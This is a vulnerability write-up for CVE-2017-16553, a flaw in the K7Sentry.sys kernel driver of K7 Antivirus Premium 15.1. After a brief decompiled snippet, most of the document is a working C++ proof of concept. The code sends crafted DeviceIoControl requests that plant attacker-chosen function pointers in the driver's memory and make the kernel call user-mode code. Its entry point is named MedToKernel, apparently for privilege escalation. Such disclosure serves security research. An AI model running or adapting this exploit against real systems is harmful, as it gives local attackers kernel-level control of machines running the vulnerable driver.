# CVE-2017-16553
# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7Sentry.sys 15.1.0.45*

# Related
The majority of this issue is still valid here so the write up isn't going to be duplicated.
[CVE-2017-16551](../CVE-2017-16551/readme.md)

# Details
## Vulnerability
The *K7Sentry.sys* exposes a significant amount of functionality through its DispatchHandler interface. Some of this calls through to common code which performs different actions depending on where it is called from. This appears to be to reduce code duplication. However, it is possible to confuse the routines and get consistent control of the instruction pointer.

This issue looks at the ControlCode 0x95002873 which is a wrapper around a call to *ZwQueryInformationFile*.

The main difference between this writeup and CVE-2017-16551 is the offset in unk9 is different:
```C++
unsigned int __usercall QueryInformationFileWrapper@<eax>(unk3 *pUnk3@<esi>)
{
    // ...
    pUnk9 = pUnk3->pUnk9;
    if ( !pUnk9 )
        return 0;
    v8 = (int (__cdecl *)(HANDLE))pUnk9->pfnQueryInformationFile_10;
    if ( !v8 )
        return 0;
    v9 = v8(pUnk3->hFile);
    // ...
}
```

The offset for this control code is 0x10 which is reflected in the UNK9 structure in the PoC code.


# PoC Code
This proof of concept code will cause a bugcheck identical to CVE-2017-16551.

```C++

#pragma pack(push)
#pragma pack(1)
// Aka Unknown2
typedef struct _UNK9
{
	DWORD offset_0;
	DWORD function_ReadFile;
	DWORD function_WriteFile;
	DWORD function_SetInformationFile;
	DWORD function_Query;
} UNK9, *PUNK9;

// Aka Unknown1
typedef struct _UNK3
{
	BYTE magic;
	BYTE ff;
	DWORD offset_2;
	PUNK9 pUnk9;
} UNK3, *PUNK3;

#pragma pack(pop)


VOID __cdecl KernelCallback(HANDLE hFile, DWORD dwUnknown)
{
	__asm
	{
		mov eax, 0xaaaaaaaa
		mov ebx, 0xbbbbbbbb
		mov ecx, 0xcccccccc
		mov edx, 0xdddddddd
		mov esi, 0xd00dd00d
		mov edi, 0xcafecafe
		mov DWORD_PTR[0xCAFED00D], 0xcafecafe
	}
}

VOID SetupMemory_0x9500286F(HANDLE hFile)
{
	BYTE outBuffer[0x8000] = { 0 };
	BYTE data[0x8000] = { 0 };

	memset(data, 0x41, sizeof(data));
	DWORD dwBytesReturned = 0;

	UNK9 stUnk9 = { 0 };
	// This must not be 0;
	stUnk9.offset_0 = 1;

	printf("Function: 0x%p\r\n", KernelCallback);

	stUnk9.function_ReadFile = (DWORD)KernelCallback;
	stUnk9.function_WriteFile = (DWORD)KernelCallback;
	stUnk9.function_SetInformationFile = (DWORD)KernelCallback;
	stUnk9.function_Query = (DWORD)KernelCallback;

	memcpy(data, &stUnk9, sizeof(UNK9));

	printf("Setting up global buffer\r\n");

	// This will fill the buffer at 0x4efe8 to be the data we pass into it
	if (!DeviceIoControl(hFile, 0x95002580, data, sizeof(data), outBuffer, sizeof(outBuffer), &dwBytesReturned, NULL))
	{
		printf("Error: 0x%08x\r\n", GetLastError());
	}
	else
	{
		printf("Success: Got data into global");
	}

	//
	// Now we need to set up the state before it, this is pretty easy as we are just passing in a 
	// single DWORD. This is 0x4efe0
	//
	printf("Setting up K and FF\r\n");
	DWORD dwUnk3Magics = 0xFF4B0000;
	if (!DeviceIoControl(hFile, 0x950025D4, &dwUnk3Magics, sizeof(DWORD), outBuffer, sizeof(outBuffer), &dwBytesReturned, NULL))
	{
		printf("Error: 0x%08x\r\n", GetLastError());
	}
	else
	{
		printf("Success: Got data into global");
	}
}

VOID TriggerFunctionCall(HANDLE hFile)
{
	// ************* CHANGE ME *************
	// This can be done dynamically if required.
	DWORD dwDriverBase = 0x86ecd000;
	// *************************************
	DWORD dwBufferPtrWeControl = 0x4f760+2 - 0x10000 + dwDriverBase;

	BYTE data[0x8000] = { 0 };
	BYTE outBuffer[0x8000] = { 0 };

	memset(data, 0x41, sizeof(data));
	DWORD dwBytesReturned = 0;
	(*(DWORD*)data) = dwBufferPtrWeControl;

	// QueryFile
	if (!DeviceIoControl(hFile, 0x95002873, data, 8, outBuffer, 4, &dwBytesReturned, NULL))
	{
		printf("Error: 0x%08x\r\n", GetLastError());
	}
	else
	{
		printf("Success: Got data into global\r\n");
	}
}


VOID MedToKernel()
{
	HANDLE 	hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	BYTE arrInput[0x1000] = { 0 };
	BYTE arrOutput[0x1000] = { 0 };
	DWORD dwBytesReturned = 0;

	SetupMemory_0x9500286F(hDevice);
	TriggerFunctionCall(hDevice);
}

```